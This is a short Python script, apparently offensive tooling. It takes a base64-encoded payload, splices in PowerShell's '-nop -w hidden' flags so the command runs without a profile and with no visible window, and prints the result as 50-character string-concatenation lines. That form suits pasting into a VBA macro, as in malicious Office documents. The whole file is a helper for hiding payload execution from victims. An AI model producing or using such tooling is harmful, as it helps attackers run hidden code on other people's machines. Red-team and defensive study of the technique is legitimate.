#!/usr/bin/python

import sys

#Verify the numbers of arguments
if len(sys.argv) < 2:
	print("[!] Use: python " + sys.argv[0] + " <payload-based64>")
	sys.exit(0)

#Saved the argument as a variable
str = sys.argv[1]

#Insert the additional arguments needed for the payload
payload= str[:10] + ".exe -nop -w hidden " + str[11:]

#Split the payload in blocks of 50 characters
n = 50
for i in range(0, len(payload), n):
    print("Str = Str + " + '"' + payload[i:i+n] + '"')
